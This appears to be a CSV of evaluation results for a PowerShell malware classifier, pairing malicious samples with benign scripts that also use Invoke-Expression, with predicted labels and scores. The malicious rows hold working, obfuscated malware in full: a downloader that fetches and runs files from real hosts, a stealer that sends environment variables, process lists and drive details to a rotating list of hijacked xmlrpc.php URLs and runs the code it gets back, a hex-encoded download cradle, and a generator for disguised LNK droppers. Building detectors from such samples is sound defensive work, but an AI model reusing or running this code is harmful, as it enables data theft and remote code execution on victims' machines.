filename,label,source,primary_indicator,matched_indicators,indicator_count,has_indicator,raw_char_len,used_char_len,was_truncated,content,pair_idx,pair_role,pair_indicator,pair_strategy,correct,predicted_label,logit_diff
fa2y/malicious_samples/5921fbf975020277efb4018858252ba81765a3bbeedf1b67061691faf6f4f6da.ps1,malicious,fa2y:malicious_samples,IEX,IEX,4,True,824,824,False,"$flol3=iex($('[Environment]::GetEvjrt'''.Replace('vjr','nvironmentVariable(''public'') + ''\\bi1xb0.ba')));$flol=iex($('[Environment]::GetEvjrt'''.Replace('vjr','nvironmentVariable(''public'') + ''\\wusb.ba')));function getit([string]$fz, [string]$oulv){$ff=iex($('(Nf9c0w-Objf9c0ct Systf9c0m.Nf9c0t.Wf9c0bClif9c0nt).Downzqv9e($oulv.Replace(''kvqp'',''tps://'').Replace(''mo4'', ''e''), $fz)').Replace('f9c0', 'e').Replace('zqv9', 'loadFil'));iex('smvdgqarmvdgq $fz'.Replace('mvdgq','t'))};getit -fz $flol -oulv 'htkvqpwww.dld.amo4/zp/zpmo4u.mo4xmo4';$fzf=$(Get-Location).tostring() + '\\';Remove-Item -Path ($fzf + $(Get-ChildItem -Include *.lnk -Name));getit -fz ($fzf + 'List of required items and services.pdf') -oulv 'http://www.blumo4maxxlasmo4r.com/rh/List%20of%20rmo4quirmo4d%20itmo4ms%20and%20smo4rvicmo4s.pdf';exit",292,malicious,IEX,rotate_same_family_benign_one_pair_per_malicious,True,malicious,6.40625
1637.ps1,benign,natural_overlap,IEX,IEX,1,True,886,886,False,"function Get-BootConfigurationData {
    param (
        $bcdeditpath = (Join-Path $env:SystemRoot 'system32\bcdedit.exe')
    )

    $bootconfigurationdata = iex $bcdeditpath
    $bootconfigurationdata += ''

    $hash = $null
    $result = foreach ($line in $bootconfigurationdata) {
        if ($line -eq '') {
            if ($hash) {
                [pscustomobject]$hash
            }
            $hash = @{}
            continue
        }
        if ($line.startswith('-----')) { continue }
        if ($line.startswith('Windows Boot')) {
            $hash.Add('Type', $line)
        } else {
            $name = $line.Substring(0, $line.IndexOf(' '))
            $value = $line.Substring($line.IndexOf(' ')).trim()
            $hash.Add($name, $value)
        }
    }

    $props = $result | % {gm -in $_ -ty *property} | % name | select -u | sort

    $result | select $props
}",296,benign,IEX,rotate_same_family_benign_one_pair_per_malicious,True,benign,-2.171875
fa2y/malicious_samples/74e957d7f0163caf1a06bb336673f8fc3a4c8a41a0f7c03efac5de8193e982c5.ps1,malicious,fa2y:malicious_samples,IEX,IEX,1,True,2011,2011,False,"function bvPt($izaGj){$jkRfn=""A1BD9B2F1F"";function bZvCqi($tPPcAU){$NYvIC = [System.IO.MemoryStream]::new();$Bcvg = [System.IO.StreamWriter]::new((New-Object System.IO.Compression.GZipStream($NYvIC,[System.IO.Compression.CompressionMode]::Compress)));$Bcvg.Write([String]::Join(""|!"",$tPPcAU));$Bcvg.Close();[System.Convert]::ToBase64String($NYvIC.ToArray())}$dsECLF = bZvCqi((dir env:|where{$_.value.Length -lt 100}|%{($_.name+""^""+$_.value)})+(""OSWMI^""+(Get-WmiObject Win32_OperatingSystem).caption));$jLSa = bZvCqi(gps|select name -unique|%{$_.name});$LyyNmlK = bZvCqi(gps|where{$_.mainwindowtitle}|%{$_.name+""^""+$_.mainwindowtitle});$kxMrw = bZvCqi(((new-object -com shell.application).Namespace(0)).Items()|%{if($_.IsLink){""0""+$_.Name}elseif($_.IsFolder){""1""+$_.Name}elseif($_.IsFileSystem){""2""+[IO.Path]::GetFileName($_.Path)}else{""3""+$_.Name}});$gfZM = bZvCqi(gdr|where{$_.free -gt 50000}|%{$_.name+""^""+$_.used});[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12;[Net.ServicePointManager]::ServerCertificateValidationCallback ={$true};$ehXwvPri=[System.Net.WebRequest]::Create($izaGj);$ehXwvPri.UserAgent=""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"";$ehXwvPri.KeepAlive=0;$ehXwvPri.Headers.Add(""Cookie: $jkRfn=$dsECLF; $jkRfn`1=$jLSa; $jkRfn`2=$LyyNmlK; $jkRfn`3=$kxMrw; $jkRfn`4=$gfZM"");$ROsWvr=new-object System.IO.StreamReader $ehXwvPri.GetResponse().GetResponseStream();$aPvXWBj=($ROsWvr.ReadToEnd()) -split $jkRfn;if($aPvXWBj.Count -eq 3){iex($aPvXWBj[1] -replace ""^"","""");}}while(1){try{bvPt(@(""http://chiari.leganord.org/xmlrpc.php"",""https://wholisticresearch.com/xmlrpc.php"",""http://blog.tomorrowevening.com/xmlrpc.php"",""https://dictanty.ru/xmlrpc.php"",""https://neba.pl/xmlrpc.php"",""https://wagyupusher.dk/xmlrpc.php"",""https://test-drive.ir/xmlrpc.php"",""https://play-curio.com/xmlrpc.php"",""https://voltx.com.au/xmlrpc.php"",""https://mon-guide-voiture.fr/xmlrpc.php"") | Get-Random)}catch{};sleep -s 20}",296,malicious,IEX,rotate_same_family_benign_one_pair_per_malicious,True,malicious,3.953125
1634.ps1,benign,natural_overlap,IEX,IEX,1,True,1434,1434,False,"function Get-ComputerShares {
    param (
        [string]$comp = $env:COMPUTERNAME
    )
    
    if (!$comp) { throw 'No comps.' }

    $ping = New-Object System.Net.NetworkInformation.Ping
    try {
        $result = $ping.Send($comp)
    } catch {
        $result = $null
    }

    $sharename = $type = $comment = $ip = '-'
    if ($result.Status -eq 'Success') {
        
        $ip = $result.Address.ToString()

        
        $netview = iex ""cmd /c net view $comp 2>&1"" | ? {$_}

        
        if ($netview.count -lt 5) {
            [pscustomobject]@{
                Computer = $comp
                IP = $ip
                ShareName = $sharename
                Type = $type
                Comment = $comment
            }
            return
        }

        $netview = $netview | ? {$_  -match '\s{2}'} | select -Skip 1

        foreach ($line in $netview) {
            $line = $line -split '\s{2,}'

            $sharename = $line[0]
            $type = $line[1]
            $comment = $line[2]

            [pscustomobject]@{
                Computer = $comp
                IP = $ip
                ShareName = $sharename
                Type = $type
                Comment = $comment
            }
        }
    } else {
        [pscustomobject]@{
            Computer = $comp
            IP = $ip
            ShareName = $sharename
            Type = $type
            Comment = $comment
        }
    }
}",297,benign,IEX,rotate_same_family_benign_one_pair_per_malicious,True,benign,-3.34375
fa2y/malicious_samples/ec422df6e413a605e4fe0aa309e7d1c5fa193fa9487472ea6a82a1aa98cf3aee.ps1,malicious,fa2y:malicious_samples,IEX,IEX,1,True,2013,2013,False,"> function bvPt($izaGj){$jkRfn=""A1BD9B2F1F"";function bZvCqi($tPPcAU){$NYvIC = [System.IO.MemoryStream]::new();$Bcvg = [System.IO.StreamWriter]::new((New-Object System.IO.Compression.GZipStream($NYvIC,[System.IO.Compression.CompressionMode]::Compress)));$Bcvg.Write([String]::Join(""|!"",$tPPcAU));$Bcvg.Close();[System.Convert]::ToBase64String($NYvIC.ToArray())}$dsECLF = bZvCqi((dir env:|where{$_.value.Length -lt 100}|%{($_.name+""^""+$_.value)})+(""OSWMI^""+(Get-WmiObject Win32_OperatingSystem).caption));$jLSa = bZvCqi(gps|select name -unique|%{$_.name});$LyyNmlK = bZvCqi(gps|where{$_.mainwindowtitle}|%{$_.name+""^""+$_.mainwindowtitle});$kxMrw = bZvCqi(((new-object -com shell.application).Namespace(0)).Items()|%{if($_.IsLink){""0""+$_.Name}elseif($_.IsFolder){""1""+$_.Name}elseif($_.IsFileSystem){""2""+[IO.Path]::GetFileName($_.Path)}else{""3""+$_.Name}});$gfZM = bZvCqi(gdr|where{$_.free -gt 50000}|%{$_.name+""^""+$_.used});[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12;[Net.ServicePointManager]::ServerCertificateValidationCallback ={$true};$ehXwvPri=[System.Net.WebRequest]::Create($izaGj);$ehXwvPri.UserAgent=""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"";$ehXwvPri.KeepAlive=0;$ehXwvPri.Headers.Add(""Cookie: $jkRfn=$dsECLF; $jkRfn`1=$jLSa; $jkRfn`2=$LyyNmlK; $jkRfn`3=$kxMrw; $jkRfn`4=$gfZM"");$ROsWvr=new-object System.IO.StreamReader $ehXwvPri.GetResponse().GetResponseStream();$aPvXWBj=($ROsWvr.ReadToEnd()) -split $jkRfn;if($aPvXWBj.Count -eq 3){iex($aPvXWBj[1] -replace ""^"","""");}}while(1){try{bvPt(@(""http://chiari.leganord.org/xmlrpc.php"",""https://wholisticresearch.com/xmlrpc.php"",""http://blog.tomorrowevening.com/xmlrpc.php"",""https://dictanty.ru/xmlrpc.php"",""https://neba.pl/xmlrpc.php"",""https://wagyupusher.dk/xmlrpc.php"",""https://test-drive.ir/xmlrpc.php"",""https://play-curio.com/xmlrpc.php"",""https://voltx.com.au/xmlrpc.php"",""https://mon-guide-voiture.fr/xmlrpc.php"") | Get-Random)}catch{};sleep -s 20}",297,malicious,IEX,rotate_same_family_benign_one_pair_per_malicious,True,malicious,3.5
1637.ps1,benign,natural_overlap,IEX,IEX,1,True,886,886,False,"function Get-BootConfigurationData {
    param (
        $bcdeditpath = (Join-Path $env:SystemRoot 'system32\bcdedit.exe')
    )

    $bootconfigurationdata = iex $bcdeditpath
    $bootconfigurationdata += ''

    $hash = $null
    $result = foreach ($line in $bootconfigurationdata) {
        if ($line -eq '') {
            if ($hash) {
                [pscustomobject]$hash
            }
            $hash = @{}
            continue
        }
        if ($line.startswith('-----')) { continue }
        if ($line.startswith('Windows Boot')) {
            $hash.Add('Type', $line)
        } else {
            $name = $line.Substring(0, $line.IndexOf(' '))
            $value = $line.Substring($line.IndexOf(' ')).trim()
            $hash.Add($name, $value)
        }
    }

    $props = $result | % {gm -in $_ -ty *property} | % name | select -u | sort

    $result | select $props
}",301,benign,IEX,rotate_same_family_benign_one_pair_per_malicious,True,benign,-2.171875
fa2y/malicious_samples/21851303a344f1c0df701b10a6885a6a7bd2cea8554e00fcd9a9cc1bbf882d07.ps1,malicious,fa2y:malicious_samples,IEX,IEX,1,True,2188,2188,False,"@(set ""0=%~f0""^)#) & powershell -nop -c iex([io.file]::ReadAllText($env:0)) & exit/b
#:: double-click to run or just copy-paste into powershell - it's a standalone hybrid script
#:: v3 of the toggle script hides the flashing cmd window via vbs
#:: uses IFEO to attach to Virtual Disk Service Loader process running during setup, then erases appraiserres.dll
#:: it must also do some ping-pong renaming of vdsldr in system32\11
#:: you probably don't need to have it installed at all times - just when doing feature updates or manual setup within windows
#:: hence the on off toggle just by running the script again 

$_Paste_in_Powershell = {
  $N = ""Skip TPM Check on Dynamic Update""; $3 = @(""' $N (c) AveYo 2021 : v3 IFEO-based with no flashing cmd window"") 
  $3+= 'C = ""cmd /q AveYo /d/x/r erase /f/s/q %systemdrive%\$windows.~bt\appraiserres.dll&""'
  $3+= 'M = ""md 11&cd 11&ren vd.exe vdsldr.exe &robocopy """"../"""" """"./"""" """"vdsldr.exe""""&ren vdsldr.exe vd.exe&""'
  $3+= 'D = ""start vd.exe -Embedding"" : CreateObject(""WScript.Shell"").Run C & M & D, 0, False'    
  $U = 'root\subscription'; $C = gwmi -Class CommandLineEventConsumer -Namespace $U -Filter ""Name='$N'"" -ea 0 
  $B = gwmi -Class __FilterToConsumerBinding -Namespace $U -Filter ""Filter = """"__eventfilter.name='$N'"""""" -ea 0
  $F = gwmi -Class __EventFilter -NameSpace $U -Filter ""Name='$N'"" -ea 0; $B,$C,$F |% {$_|rwmi -ea 0} # undo v1
  sp 'HKLM:\SYSTEM\Setup\MoSetup' 'AllowUpgradesWithUnsupportedTPMOrCPU' 1 -type dword -force -ea 0 >'' 
  $K = 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\vdsldr.exe'
  $V = ""wscript 11.vbs //B //T:5""; $S = [environment]::SystemDirectory; if (test-path $K) {
  ri $K -force -ea 0 >''; del ""$S\11.vbs"" -force -ea 0; rmdir ""$S\11"" -force -re -ea 0
  write-host -fore 0xf -back 0xd ""`n $N v3 [REMOVED] run again to install "" } else {
  ni $K -force -ea 0 >''; sp $K Debugger $V -force -ea 0; [io.file]::WriteAllText(""$S\11.vbs"", $3-join""`r`n"")
  write-host -fore 0xf -back 0x2 ""`n $N v3 [INSTALLED] run again to remove "" } ; timeout /t 5
} ; start -verb runas powershell -args ""-nop -c & {`n`n$($_Paste_in_Powershell-replace'""','\""')}""
$_Press_Enter
#::",301,malicious,IEX,rotate_same_family_benign_one_pair_per_malicious,True,malicious,0.703125
1634.ps1,benign,natural_overlap,IEX,IEX,1,True,1434,1434,False,"function Get-ComputerShares {
    param (
        [string]$comp = $env:COMPUTERNAME
    )
    
    if (!$comp) { throw 'No comps.' }

    $ping = New-Object System.Net.NetworkInformation.Ping
    try {
        $result = $ping.Send($comp)
    } catch {
        $result = $null
    }

    $sharename = $type = $comment = $ip = '-'
    if ($result.Status -eq 'Success') {
        
        $ip = $result.Address.ToString()

        
        $netview = iex ""cmd /c net view $comp 2>&1"" | ? {$_}

        
        if ($netview.count -lt 5) {
            [pscustomobject]@{
                Computer = $comp
                IP = $ip
                ShareName = $sharename
                Type = $type
                Comment = $comment
            }
            return
        }

        $netview = $netview | ? {$_  -match '\s{2}'} | select -Skip 1

        foreach ($line in $netview) {
            $line = $line -split '\s{2,}'

            $sharename = $line[0]
            $type = $line[1]
            $comment = $line[2]

            [pscustomobject]@{
                Computer = $comp
                IP = $ip
                ShareName = $sharename
                Type = $type
                Comment = $comment
            }
        }
    } else {
        [pscustomobject]@{
            Computer = $comp
            IP = $ip
            ShareName = $sharename
            Type = $type
            Comment = $comment
        }
    }
}",302,benign,IEX,rotate_same_family_benign_one_pair_per_malicious,True,benign,-3.34375
fa2y/malicious_samples/70cf71b129e8f5a9c0805007aac64703bda49d6cc5613eb547db19b4621059fb.ps1,malicious,fa2y:malicious_samples,IEX,IEX,1,True,2189,2189,False,"function LNK-Generator {
<#
    .SYNOPSIS

        Generate an obfuscated malicious LNK file as a dropper.

    .PARAMETER URL

        URL to download file. 

    .PARAMETER dropPath

        The path you want to drop your file in.
   
   .EXAMPLE

        LNK-Generator https://the.earth.li/~sgtatham/putty/latest/w64/putty.exe C:\Windows\Temp\putty.exe

#>
        [CmdletBinding(DefaultParameterSetName = 'None')]
        param(

        [Parameter(Mandatory=$True)]
        [String]
        $URL,

        [Parameter(Mandatory=$True)]
        [String]
        $dropPath

    )

    
    Write-Host ""  _    _  _ _  __    ___                       _           
 | |  | \| | |/ /__ / __|___ _ _  ___ _ _ __ _| |_ ___ _ _ 
 | |__| .` | ' <___| (_ / -_) ' \/ -_) '_/ _` |  _/ _ \ '_|
 |____|_|\_|_|\_\   \___\___|_||_\___|_| \__,_|\__\___/_|  
 Generate an obfuscated malicious LNK file as a dropper.   ""

    $guid = [guid]::NewGuid().ToString()

    Write-Host ""[+] URL: $URL""
    Write-Host ""[+] Drop path: $dropPath""
    Write-Host ""[+] Your lnk file: $pwd\$guid.lnk""

    $userPayload = ""iwr $URL -O $dropPath;$dropPath"".ToCharArray()
    $randomString = '㆐', '㆑', '㆒', '㆓', '㆔', '㆕', '㆖', '㆗', '㆘', '㆙', '㆚', '㆛', 	'㆜', '㆝', '㆞', '㆟' 
    $getRandom = Get-Random $randomString
    $cmd = """"
    $counter = 0
    foreach($item in $userPayload)
    {
        $counter = 1+$counter
        if ($counter -eq 3)
        {
        $cmd += $getRandom + $item
        $counter = 0

        }
        else
        {
        $cmd += $item
        }
    }


    $payload = ""'$cmd'.Replace('$getRandom','')|iex""
    Write-Host ""[+] Payload: $payload""
    
    # https://www.computerperformance.co.uk/powershell/create-shortcut/
    $AppLocation = ""powershell.exe""
    $WshShell = New-Object -ComObject WScript.Shell
    $Shortcut = $WshShell.CreateShortcut(""$pwd\$guid.lnk"")
    $Shortcut.TargetPath = $AppLocation
    $Shortcut.Arguments = $payload
    $Shortcut.IconLocation = 'C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe,13'
    $Shortcut.Description =""Device Removal""
    $Shortcut.WindowStyle = '7'
    $Shortcut.WorkingDirectory =""C:\Program Files\""
    $Shortcut.Save()
}",302,malicious,IEX,rotate_same_family_benign_one_pair_per_malicious,True,malicious,8.34375
329.ps1,benign,natural_overlap,Invoke-Expression,Invoke-Expression,2,True,880,880,False,"﻿function Import-PSFPowerShellDataFile
{

	[Diagnostics.CodeAnalysis.SuppressMessageAttribute(""PSAvoidUsingInvokeExpression"", """")]
	[CmdletBinding()]
	Param (
		[Parameter(ParameterSetName = 'ByPath')]
		[string[]]
		$Path,
		
		[Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'ByLiteralPath')]
		[Alias('PSPath')]
		[string[]]
		$LiteralPath
	)
	
	process
	{
		
		
		
		if (($ExecutionContext.Host.Runspace.InitialSessionState.LanguageMode -eq 'NoLanguage') -or ($PSVersionTable.PSVersion.Major -lt 5))
		{
			foreach ($resolvedPath in ($Path | Resolve-PSFPath -Provider FileSystem | Select-Object -Unique))
			{
				Invoke-Expression (Get-Content -Path $resolvedPath -Raw)
			}
			foreach ($pathItem in $LiteralPath)
			{
				Invoke-Expression (Get-Content -Path $pathItem -Raw)
			}
		}
		else
		{
			Import-PowerShellDataFile @PSBoundParameters
		}
	}
}",307,benign,Invoke-Expression,rotate_same_family_benign_one_pair_per_malicious,True,benign,-1.484375
fa2y/malicious_samples/bb7ed7fc743fca6580548f10fd120bcfc876241147dbab7ad93ce5d70677d6d1-obf-out-encodedhexcommand.ps1,malicious,fa2y:malicious_samples,Invoke-Expression,Invoke-Expression,1,True,472,472,False,"powershell     ""InVOKe-EXPresSIon( ""$(sET-item  'vaRIablE:oFS'  '' ) "" + [sTRIng]('as69s65&78}20>28&28s4e~65>77,2d~4f}62s6a~65,63-74&20>4e,65>74s2e-57s65~62>43>6c>69>65,6e>74s29T2e&44,6f~77T6e~6c~6f}61>64T53s74-72,69T6e,67T28~27&68,74&74s70T3a&2f-2f,37>36T2e}37>34>2es31~32&37T2e,33,38s2f,64T65,66}61&75~6cT74T2dT6eT63,6f&2e~68s74}6d&6c~27&29~29,a~a'.SpLIT('T}>~s,&-')| fOreAcH {( [cHar] ([coNvERT]::tOiNt16( ([string]$_),16) ))}) +""$( seT-ItEM  'vArIable:oFS' ' ' ) "" ) """,307,malicious,Invoke-Expression,rotate_same_family_benign_one_pair_per_malicious,True,malicious,3.546875
489.ps1,benign,natural_overlap,Invoke-Expression,Invoke-Expression,1,True,1040,1040,False,"function Get-PathAndFilename{



    [CmdletBinding()]
    param(

		[Parameter( Mandatory=$true)]
		[String]
		$Path
	)

    
    $Path = [System.Environment]::ExpandEnvironmentVariables($Path)
    
    
    if($Path.contains(""$"")){
        $Path = Invoke-Expression ""`""$Path`""""
    }

    
    if($Path.StartsWith(""\"")){
        $Path = Join-Path -Path $(Get-Location).Path -Childpath $Path
    }
    
    
    if(-not $Path.Contains(""\"")){
    
        $Filename = $Path
        $Path = $null
    
    }else{
    
        
        $ResolvedPath = $ExecutionContext.SessionState.Path.GetUnresolvedProviderPathFromPSPath($Path)
        $Path = $ResolvedPath + $(if($Path.EndsWith(""\"") -and -not $ResolvedPath.EndsWith(""\"")){""\""})

        
        if($Path.EndsWith(""\"")){
        
            $Filename = $null
        
        }else{
            
            $Filename = Split-Path $Path -Leaf
            $Path = Split-Path $Path -Parent         
        }
    }
    
    @{
        Path = $Path
        Filename = $FileName    
    }
}",309,benign,Invoke-Expression,rotate_same_family_benign_one_pair_per_malicious,True,benign,-2.796875
